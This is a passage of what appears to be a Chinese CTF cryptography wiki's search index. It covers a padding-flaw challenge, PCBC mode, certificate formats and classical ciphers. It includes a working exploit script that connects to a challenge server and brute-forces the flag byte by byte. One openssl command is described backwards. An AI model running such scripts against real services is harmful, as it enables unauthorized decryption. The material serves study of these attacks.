\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7be1\u6539\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u63a7\u5236\u53bb\u6389\u7684 padding \u5b57\u8282\u6570\u3002","title":"\u5206\u6790"},{"location":"crypto/blockcipher/mode/padding/#_3","text":"\u9009\u62e9 choice2\uff0c\u8ffd\u52a0 256-33 =223 \u5b57\u8282\uff0c\u4f7f\u5f53\u524d flag \u4e0d\u9700\u8981\u586b\u5145\uff0c\u8ffd\u52a0\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u6210 chr(256-32) \u3002 \u670d\u52a1\u5668\u5bf9 flag \u8ffd\u52a0\u6211\u4eec\u7684\u4fe1\u606f\uff0c\u5e76\u8fdb\u884c s \u76d2\u66ff\u6362\uff0c\u7ed3\u679c\u8d4b\u7ed9\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u3002 \u6211\u4eec\u518d\u6b21\u9009\u62e9 choice2\uff0c\u8fd9\u91cc\u7531\u4e8e\u6211\u4eec\u9700\u8981\u8ffd\u52a0\uff0c\u670d\u52a1\u5668\u4f1a\u5c06\u7c7b\u4e2d\u7684 flag \u53d8\u91cf\u53d6\u51fa\u8fdb\u884c\u9006 S \u76d2\u66ff\u6362\u548c unpad\uff0c\u8fd9\u6837\u6309\u7167\u8fd9\u4e2a unpad \u7b97\u6cd5\u4f1a\u628a\u540e\u9762 224 \u5b57\u8282\u7684\u5168\u90e8\u5f53\u6210 padding\u53bb\u6389\uff0c\u660e\u6587\u5269\u4e0b\u4e86\u771f\u6b63 flag \u7684\u524d32\u4f4d\u3002 \u6211\u4eec\u6b64\u65f6\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26 i,\u90a3\u4e48\u6b64\u65f6\u52a0\u5bc6\u7684\u5bf9\u8c61\u5c31\u662f flag[:32]+i \u3002 \u9009\u62e9 choice1 \u5bf9\u5f53\u524d flag \u52a0\u5bc6\uff0c\u63a7\u5236 i \u8fdb\u884c\u7206\u7834\uff0c\u5982\u679c\u5f97\u5230\u7684\u5bc6\u6587\u548c\u6700\u521d\u7684 flag \u52a0\u5bc6\u7684\u5bc6\u6587\u4e00\u6837\uff0c\u5c31\u5f97\u5230\u4e86 flag \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u9010\u5b57\u8282\u7206\u7834\uff0c\u76f4\u81f3\u83b7\u53d6\u5168\u90e8\u7684 flag\u3002 exp \u5982\u4e0b\uff1a # -*- coding: utf-8 -*- from hashlib import sha256 import socket import string import itertools HOST = '106.75.13.64' PORT = 54321 sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( HOST , PORT )) def brute_force ( pad , shavalue ): for str in itertools . product ( string . ascii_letters + string . digits , repeat = 4 ): str = '' . join ( str ) if sha256 ( str + pad ) . hexdigest () == shavalue : print str return str def choice1 (): sock . send ( \"1 \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 30 :] sock . recv ( 1024 ) . strip () return result def choice2 ( pad ): sock . send ( \"2 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( pad + \" \\n \" ) sock . recv ( 1024 ) . strip () sock . recv ( 1024 ) . strip () def choice3 ( str ): sock . send ( \"3 \\n \" ) sock . recv ( 1024 ) . strip () sock . send ( str + \" \\n \" ) result = sock . recv ( 1024 ) . strip ()[ 33 :] sock . recv ( 1024 ) . strip () return result content = sock . recv ( 1024 ) . strip () pad = content [ 12 : 12 + 16 ] hash = content [ 33 : 33 + 64 ] sock . recv ( 1024 ) . strip () sock . send ( str ( brute_force ( pad , hash )) + \" \\n \" ) print sock . recv ( 1024 ) . strip () flag_enc = choice1 () flag = \"\" for i in range ( 33 ): a = '' . join ([ 'a' for _ in range ( 223 )]) a = a [: - 1 ] + chr ( 224 + i ) for c in string . printable : print c + flag choice2 ( a ) choice2 ( c + flag ) if choice1 () == flag_enc : flag = c + flag print \"success:\" , flag break flag{H4ve_fun_w1th_p4d_and_unp4d}","title":"\u5229\u7528"},{"location":"crypto/blockcipher/mode/pcbc/","text":"PCBC \u00b6 PCBC \u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u7279\u70b9 \u00b6 \u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316 \u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd","title":"PCBC"},{"location":"crypto/blockcipher/mode/pcbc/#pcbc","text":"PCBC \u7684\u5168\u79f0\u4e3a\u660e\u6587\u5bc6\u7801\u5757\u94fe\u63a5\uff08Plaintext cipher-block chaining\uff09\u3002\u4e5f\u79f0\u4e3a\u586b\u5145\u5bc6\u7801\u5757\u94fe\u63a5\uff08Propagating cipher-block chaining\uff09\u3002","title":"PCBC"},{"location":"crypto/blockcipher/mode/pcbc/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/pcbc/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/pcbc/#_3","text":"\u89e3\u5bc6\u8fc7\u7a0b\u96be\u4ee5\u5e76\u884c\u5316 \u4e92\u6362\u90bb\u63a5\u7684\u5bc6\u6587\u5757\u4e0d\u4f1a\u5bf9\u540e\u9762\u7684\u5bc6\u6587\u5757\u9020\u6210\u5f71\u54cd","title":"\u7279\u70b9"},{"location":"crypto/certificate/introduction/","text":"\u8bc1\u4e66\u683c\u5f0f \u00b6 PEM \u00b6 PEM \u4ee5 -----BEGIN \u5f00\u5934\uff0c\u4ee5 -----END \u7ed3\u5c3e\uff0c\u4e2d\u95f4\u5305\u542b ASN.1 \u683c\u5f0f\u7684\u6570\u636e\u3002ASN.1 \u662f\u7ecf\u8fc7 base64 \u8f6c\u7801\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u3002 Wikipedia \u4e0a\u6709\u5b8c\u6574 PEM \u6587\u4ef6\u7684\u4f8b\u5b50\u3002 \u7528 Python 3 \u548c PyCryptodome \u5e93\u53ef\u4ee5\u4e0e PEM \u6587\u4ef6\u4ea4\u4e92\u5e76\u63d0\u53d6\u76f8\u5173\u6570\u636e\u3002\u4f8b\u5982\u6211\u4eec\u60f3\u63d0\u53d6\u51fa\u6a21\u6570 n \uff1a #!/usr/bin/env python3 from Crypto.PublicKey import RSA with open ( \"certificate.pem\" , \"r\" ) as f : key = RSA . import_key ( f . read ()) print ( key . n ) DER \u00b6 DER \u662f ASN.1 \u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u3002\u540e\u7f00 .cer \u6216 .crt \u7684\u8bc1\u4e66\u901a\u5e38\u5305\u542b DER \u683c\u5f0f\u7684\u6570\u636e\uff0c\u4f46 Windows \u4e5f\u53ef\u80fd\u4f1a\u63a5\u53d7 PEM \u683c\u5f0f\u7684\u6570\u636e\u3002 \u6211\u4eec\u53ef\u4ee5\u7528 openssl \u5c06 PEM \u6587\u4ef6\u8f6c\u5316\u4e3a DER \u6587\u4ef6\uff1a openssl x509 -inform DER -in certificate.der > certificate.pem \u73b0\u5728\u95ee\u9898\u88ab\u7b80\u5316\u6210\u4e86\u5982\u4f55\u8bfb\u53d6 PEM \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91cd\u590d\u4f7f\u7528\u4e0a\u4e00\u5c0f\u8282\u4e2d\u7684 Python \u4ee3\u7801\u3002 \u5176\u4ed6\u683c\u5f0f\u8f6c\u6362 \u00b6 openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem \u5f15\u7528 \u00b6 Attacking RSA for fun and CTF points \u2013 part 1 What are the differences between .pem, .cer and .der?","title":"\u8bc1\u4e66\u683c\u5f0f"},{"location":"crypto/certificate/introduction/#_1","text":"","title":"\u8bc1\u4e66\u683c\u5f0f"},{"location":"crypto/certificate/introduction/#pem","text":"PEM \u4ee5 -----BEGIN \u5f00\u5934\uff0c\u4ee5 -----END \u7ed3\u5c3e\uff0c\u4e2d\u95f4\u5305\u542b ASN.1 \u683c\u5f0f\u7684\u6570\u636e\u3002ASN.1 \u662f\u7ecf\u8fc7 base64 \u8f6c\u7801\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u3002 Wikipedia \u4e0a\u6709\u5b8c\u6574 PEM \u6587\u4ef6\u7684\u4f8b\u5b50\u3002 \u7528 Python 3 \u548c PyCryptodome \u5e93\u53ef\u4ee5\u4e0e PEM \u6587\u4ef6\u4ea4\u4e92\u5e76\u63d0\u53d6\u76f8\u5173\u6570\u636e\u3002\u4f8b\u5982\u6211\u4eec\u60f3\u63d0\u53d6\u51fa\u6a21\u6570 n \uff1a #!/usr/bin/env python3 from Crypto.PublicKey import RSA with open ( \"certificate.pem\" , \"r\" ) as f : key = RSA . import_key ( f . read ()) print ( key . n )","title":"PEM"},{"location":"crypto/certificate/introduction/#der","text":"DER \u662f ASN.1 \u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u3002\u540e\u7f00 .cer \u6216 .crt \u7684\u8bc1\u4e66\u901a\u5e38\u5305\u542b DER \u683c\u5f0f\u7684\u6570\u636e\uff0c\u4f46 Windows \u4e5f\u53ef\u80fd\u4f1a\u63a5\u53d7 PEM \u683c\u5f0f\u7684\u6570\u636e\u3002 \u6211\u4eec\u53ef\u4ee5\u7528 openssl \u5c06 PEM \u6587\u4ef6\u8f6c\u5316\u4e3a DER \u6587\u4ef6\uff1a openssl x509 -inform DER -in certificate.der > certificate.pem \u73b0\u5728\u95ee\u9898\u88ab\u7b80\u5316\u6210\u4e86\u5982\u4f55\u8bfb\u53d6 PEM \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91cd\u590d\u4f7f\u7528\u4e0a\u4e00\u5c0f\u8282\u4e2d\u7684 Python \u4ee3\u7801\u3002","title":"DER"},{"location":"crypto/certificate/introduction/#_2","text":"openssl x509 -outform der -in certificate.pem -out certificate.der openssl x509 -inform der -in certificate.cer -out certificate.pem","title":"\u5176\u4ed6\u683c\u5f0f\u8f6c\u6362"},{"location":"crypto/certificate/introduction/#_3","text":"Attacking RSA for fun and CTF points \u2013 part 1 What are the differences between .pem, .cer and .der?","title":"\u5f15\u7528"},{"location":"crypto/classical/introduction/","text":"\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb \u00b6 \u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u5355\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5bc6\u7801\u3002 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u8bbe\u8ba1\u8005\u4e3b\u8981\u8003\u8651\u6d88\u606f\u7684\u4fdd\u5bc6\u6027\uff0c\u4f7f\u5f97\u53ea\u6709\u76f8\u5173\u5bc6\u94a5\u7684\u4eba\u624d\u53ef\u4ee5\u89e3\u5bc6\u5bc6\u6587\u83b7\u5f97\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u6d88\u606f\u7684\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u5219\u5e76\u6ca1\u6709\u8fdb\u884c\u592a\u591a\u7684\u8003\u8651\u3002 \u62d3\u5c55\u9605\u8bfb \u53e4\u5178\u5bc6\u7801\u5b66\u53d1\u5c55\u53f2 \u53e4\u5178\u5bc6\u7801\u2014\u2014\u7ef4\u57fa\u767e\u79d1","title":"\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb"},{"location":"crypto/classical/introduction/#_1","text":"\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd\u5355\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u591a\u8868\u66ff\u4ee3\u5bc6\u7801\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5bc6\u7801\u3002 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u53e4\u5178\u5bc6\u7801\u5b66\u4e2d\uff0c\u8bbe\u8ba1\u8005\u4e3b\u8981\u8003\u8651\u6d88\u606f\u7684\u4fdd\u5bc6\u6027\uff0c\u4f7f\u5f97\u53ea\u6709\u76f8\u5173\u5bc6\u94a5\u7684\u4eba\u624d\u53ef\u4ee5\u89e3\u5bc6\u5bc6\u6587\u83b7\u5f97\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u5bf9\u4e8e\u6d88\u606f\u7684\u5b8c\u6574\u6027\u548c\u4e0d\u53ef\u5426\u8ba4\u6027\u5219\u5e76\u6ca1\u6709\u8fdb\u884c\u592a\u591a\u7684\u8003\u8651\u3002 \u62d3\u5c55\u9605\u8bfb \u53e4\u5178\u5bc6\u7801\u5b66\u53d1\u5c55\u53f2 \u53e4\u5178\u5bc6\u7801\u2014\u2014\u7ef4\u57fa\u767e\u79d1","title":"\u53e4\u5178\u5bc6\u7801\u7b80\u4ecb"},{"location":"crypto/classical/monoalphabetic/","text":"\u5355\u8868\u4ee3\u6362\u52a0\u5bc6 \u00b6 \u901a\u7528\u7279\u70b9 \u00b6 \u5728\u5355\u8868\u66ff\u6362\u52a0\u5bc6\u4e2d\uff0c\u6240\u6709\u7684\u52a0\u5bc6\u65b9\u5f0f\u51e0\u4e4e\u90fd\u6709\u4e00\u4e2a\u5171\u6027\uff0c\u90a3\u5c31\u662f\u660e\u5bc6\u6587\u4e00\u4e00\u5bf9\u5e94\u3002\u6240\u4ee5\u8bf4\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u8fdb\u884c\u7834\u89e3 \u5728\u5bc6\u94a5\u7a7a\u95f4\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u91c7\u7528\u66b4\u529b\u7834\u89e3\u65b9\u5f0f \u5728\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u8bcd\u9891\u5206\u6790\uff0c http://quipqiup.com/ \u5f53\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u5927\uff0c\u800c\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u77ed\u7684\u60c5\u51b5\u4e0b\uff0c\u7834\u89e3\u8f83\u4e3a\u56f0\u96be\u3002 \u51ef\u6492\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u51ef\u6492\u5bc6\u7801\uff08Caesar\uff09\u52a0\u5bc6\u65f6\u4f1a\u5c06\u660e\u6587\u4e2d\u7684 \u6bcf\u4e2a\u5b57\u6bcd \u90fd\u6309\u7167\u5176\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u5411\u540e\uff08\u6216\u5411\u524d\uff09\u79fb\u52a8\u56fa\u5b9a\u6570\u76ee\uff08 \u5faa\u73af\u79fb\u52a8 \uff09\u4f5c\u4e3a\u5bc6\u6587\u3002\u4f8b\u5982\uff0c\u5f53\u504f\u79fb\u91cf\u662f\u5de6\u79fb 3 \u7684\u65f6\u5019\uff08\u89e3\u5bc6\u65f6\u7684\u5bc6\u94a5\u5c31\u662f 3\uff09\uff1a \u660e\u6587\u5b57\u6bcd\u8868\uff1aABCDEFGHIJKLMNOPQRSTUVWXYZ \u5bc6\u6587\u5b57\u6bcd\u8868\uff1aDEFGHIJKLMNOPQRSTUVWXYZABC \u4f7f\u7528\u65f6\uff0c\u52a0\u5bc6\u8005\u67e5\u627e\u660e\u6587\u5b57\u6bcd\u8868\u4e2d\u9700\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u4e2d\u7684\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u6240\u5728\u4f4d\u7f6e\uff0c\u5e76\u4e14\u5199\u4e0b\u5bc6\u6587\u5b57\u6bcd\u8868\u4e2d\u5bf9\u5e94\u7684\u5b57\u6bcd\u3002\u9700\u8981\u89e3\u5bc6\u7684\u4eba\u5219\u6839\u636e\u4e8b\u5148\u5df2\u77e5\u7684\u5bc6\u94a5\u53cd\u8fc7\u6765\u64cd\u4f5c\uff0c\u5f97\u5230\u539f\u6765\u7684\u660e\u6587\u3002\u4f8b\u5982\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5bc6\u6587\uff1aWKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728 \u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0 \uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1a ROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09 \u6b64\u5916\uff0c\u8fd8\u6709\u8fd8\u6709\u4e00\u79cd\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801 Keyed Caesar\u3002\u5176\u57fa\u672c\u539f\u7406\u662f \u5229\u7528\u4e00\u4e2a\u5bc6\u94a5\uff0c\u5c06\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4e00\u822c\u8f6c\u5316\u4e3a\u5b57\u6bcd\u8868\u5bf9\u5e94\u987a\u5e8f\u7684\u6570\u5b57\uff09\uff0c\u5206\u522b\u4ee5\u8fd9\u4e00\u6570\u5b57\u4e3a\u5bc6\u94a5\u52a0\u5bc6\u660e\u6587\u7684\u6bcf\u4e00\u4f4d\u5b57\u6bcd\u3002 \u8fd9\u91cc\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u5bab\u4fdd\u9e21\u4e01\u961f Crypto 100 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u5bc6\u6587\uff1as0a6u3u1s0bv1a \u5bc6\u94a5\uff1aguangtou \u504f\u79fb\uff1a6,20,0,13,6,19,14,20 \u660e\u6587\uff1ay0u6u3h1y0uj1u \u7834\u89e3 \u00b6 \u5bf9\u4e8e\u4e0d\u5e26\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u5176\u57fa\u672c\u7684\u7834\u89e3\u65b9\u6cd5\u6709\u4e24\u79cd\u65b9\u5f0f \u904d\u5386 26 \u4e2a\u504f\u79fb\u91cf\uff0c\u9002\u7528\u4e8e\u666e\u904d\u60c5\u51b5 \u5229\u7528\u8bcd\u9891\u5206\u6790\uff0c\u9002\u7528\u4e8e\u5bc6\u6587\u8f83\u957f\u7684\u60c5\u51b5\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u80af\u5b9a\u53ef\u4ee5\u5f97\u5230\u660e\u6587\uff0c\u800c\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u5219\u4e0d\u4e00\u5b9a\u53ef\u4ee5\u5f97\u5230\u6b63\u786e\u7684\u660e\u6587\u3002 \u800c\u5bf9\u4e8e\u57fa\u4e8e\u5bc6\u94a5\u7684\u51ef\u6492\u5bc6\u7801\u6765\u8bf4\uff0c\u4e00\u822c\u6765\u8bf4\u5fc5\u987b\u77e5\u9053\u5bf9\u5e94\u7684\u5bc6\u94a5\u3002 \u5de5\u5177 \u00b6 \u4e00\u822c\u6211\u4eec\u6709\u5982\u4e0b\u7684\u5de5\u5177\uff0c\u5176\u4e2dJPK\u6bd4\u8f83\u901a\u7528\u3002 JPK\uff0c\u53ef\u89e3\u5e26\u5bc6\u94a5\u4e0e\u4e0d\u5e26\u5bc6\u94a5 http://planetcalc.com/1434/ http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php \u79fb\u4f4d\u5bc6\u7801 \u00b6 \u4e0e\u51ef\u6492\u5bc6\u7801\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u79fb\u4f4d\u5bc6\u7801\u4e0d\u4ec5\u4f1a\u5904\u7406\u5b57\u6bcd\uff0c\u8fd8\u4f1a\u5904\u7406\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26\uff0c\u5e38\u7528 ASCII \u7801\u8868\u8fdb\u884c\u79fb\u4f4d\u3002\u5176\u7834\u89e3\u65b9\u6cd5\u4e5f\u662f\u904d\u5386\u6240\u6709\u7684\u53ef\u80fd\u6027\u6765\u5f97\u5230\u53ef\u80fd\u7684\u7ed3\u679c\u3002 Atbash Cipher \u00b6 \u539f\u7406 \u00b6 \u57c3\u7279\u5df4\u4ec0\u7801\uff08Atbash Cipher\uff09\u5176\u5b9e\u53ef\u4ee5\u89c6\u4e3a\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684\u7b80\u5355\u66ff\u6362\u5bc6\u7801\u7684\u7279\u4f8b\uff0c\u5b83\u4f7f\u7528\u5b57\u6bcd\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4ee3\u8868\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u3002\u5728\u7f57\u9a6c\u5b57\u6bcd\u8868\u4e2d\uff0c\u5b83\u662f\u8fd9\u6837\u51fa\u73b0\u7684\uff1a \u660e\u6587\uff1aA B C D E F G H I J K L M N O P Q R S T U V W X Y Z \u5bc6\u6587\uff1aZ Y X W V U T S R Q P O N M L K J I H G F E D C B A \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff1a \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1agsv jfrxp yildm ulc qfnkh levi gsv ozab wlt \u7834\u89e3 \u00b6 \u53ef\u4ee5\u770b\u51fa\u5176\u5bc6\u94a5\u7a7a\u95f4\u8db3\u591f\u77ed\uff0c\u540c\u65f6\u5f53\u5bc6\u6587\u8db3\u591f\u957f\u65f6\uff0c\u4ecd\u7136\u53ef\u4ee5\u91c7\u7528\u8bcd\u9891\u5206\u6790\u7684\u65b9\u6cd5\u89e3\u51b3\u3002 \u5de5\u5177 \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/ \u7b80\u5355\u66ff\u6362\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u7b80\u5355\u66ff\u6362\u5bc6\u7801\uff08Simple Substitution Cipher\uff09\u52a0\u5bc6\u65f6\uff0c\u5c06\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u66ff\u6362\u4e3a\u4e0e\u4e4b\u552f\u4e00\u5bf9\u5e94\u4e14\u4e0d\u540c\u7684\u5b57\u6bcd\u3002\u5b83\u4e0e\u607a\u6492\u5bc6\u7801\u4e4b\u95f4\u7684\u533a\u522b\u662f\u5176\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u5b57\u6bcd\u4e0d\u662f\u7b80\u5355\u7684\u79fb\u4f4d\uff0c\u800c\u662f\u5b8c\u5168\u662f\u6df7\u4e71\u7684\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5176\u7834\u89e3\u96be\u5ea6\u8981\u9ad8\u4e8e\u51ef\u6492\u5bc6\u7801\u3002 \u6bd4\u5982\uff1a \u660e\u6587\u5b57\u6bcd : abcdefghijklmnopqrstuvwxyz \u5bc6\u94a5\u5b57\u6bcd : phqgiumeaylnofdxjkrcvstzwb a \u5bf9\u5e94 p\uff0cd \u5bf9\u5e94 h\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 \u660e\u6587\uff1athe quick brown fox jumps over the lazy dog \u5bc6\u6587\uff1acei jvaql hkdtf udz yvoxr dsik cei npbw gdm \u800c\u89e3\u5bc6\u65f6\uff0c\u6211\u4eec\u4e00\u822c\u662f\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u5b57\u6bcd\u7684\u5bf9\u5e94\u89c4\u5219\uff0c\u624d\u53ef\u4ee5\u6b63\u5e38\u89e3\u5bc6\u3002 \u7834\u89e3 \u00b6 \u7531\u4e8e\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5bfc\u81f4\u5176\u6240\u6709\u7684\u5bc6\u94a5\u4e2a\u6570\u662f 26! 26! \uff0c\u6240\u4ee5\u51e0\u4e4e\u4e0a\u4e0d\u53ef\u80fd\u4f7f\u7528\u66b4\u529b\u7684\u89e3\u51b3\u65b9\u5f0f\u3002\u6240\u4ee5\u6211\u4eec \u4e00\u822c\u91c7\u7528\u8bcd\u9891\u5206\u6790\u3002 \u5de5\u5177 \u00b6 http://quipqiup.com/ \u4eff\u5c04\u5bc6\u7801 \u00b6 \u539f\u7406 \u00b6 \u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u51fd\u6570\u662f E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m \uff0c\u5176\u4e2d x x \u8868\u793a\u660e\u6587\u6309\u7167\u67d0\u79cd\u7f16\u7801\u5f97\u5230\u7684\u6570\u5b57 a a \u548c m m \u4e92\u8d28 m m \u662f\u7f16\u7801\u7cfb\u7edf\u4e2d\u5b57\u6bcd\u7684\u6570\u76ee\u3002 \u89e3\u5bc6\u51fd\u6570\u662f D(x)=a^{-1}(x-b)\\pmod m D(x)=a^{-1}(x-b)\\pmod m \uff0c\u5176\u4e2d a^{-1} a^{-1} \u662f a a \u5728 \\mathbb{Z}_{m} \\mathbb{Z}_{m} \u7fa4\u7684\u4e58\u6cd5\u9006\u5143\u3002 \u4e0b\u9762\u6211\u4eec\u4ee5 E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 \u51fd\u6570\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\uff0c\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e3a AFFINE CIPHER \uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u91c7\u7528\u5b57\u6bcd\u886826\u4e2a\u5b57\u6bcd\u4f5c\u4e3a\u7f16\u7801\u7cfb\u7edf \u660e\u6587 A F F I N E C I P H E R x 0 5 5 8 13 4 2 8 15 7 4 17 y=5x+8 y=5x+8 8 33 33 48 73 28 18 48 83 43 28 93 y\\mod26 y\\mod26 8 7 7 22 21 2 18 22 5 17 2 15 \u5bc6\u6587 I H H W V C S W F R C P \u5176\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u662f IHHWVCSWFRCP \u3002 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u6b63\u5e38\u89e3\u5bc6\u8005\u5177\u6709a\u4e0eb\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 a^{-1} a^{-1} \u4e3a 21\uff0c\u6240\u4ee5\u5176\u89e3\u5bc6\u51fd\u6570\u662f D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} \uff0c\u89e3\u5bc6\u5982\u4e0b \u5bc6\u6587 I H H W V C S W F R C P y y 8 7 7 22 21 2 18 22 5 17 2 15 x=21(y-8) x=21(y-8) 0 -21 -21 294 273 -126 210 294 -63 189 -126 147 x\\mod26 x\\mod26 0 5 5 8 13 4 2 8 15 7 4 17 \u660e\u6587 A F F I N E C I P H E R \u53ef\u4ee5\u770b\u51fa\u5176\u7279\u70b9\u5728\u4e8e\u53ea\u6709 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\u3002 \u7834\u89e3 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u4eff\u5c04\u5bc6\u7801\u5bf9\u4e8e\u4efb\u610f\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u6bcd\uff0c\u5176\u6700\u540e\u5f97\u5230\u7684\u5bc6\u6587\u5fc5\u7136\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u5176\u4e5f\u5177\u6709\u6700\u901a\u7528\u7684\u7279\u70b9\u3002\u5f53\u5bc6\u6587\u957f\u5ea6\u8db3\u591f\u957f\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9891\u7387\u5206\u6790\u7684\u65b9\u6cd5\u6765\u89e3\u51b3\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4f55\u653b\u51fb\u8be5\u5bc6\u7801\u3002\u53ef\u4ee5\u770b\u51fa\u5f53 a=1 a=1 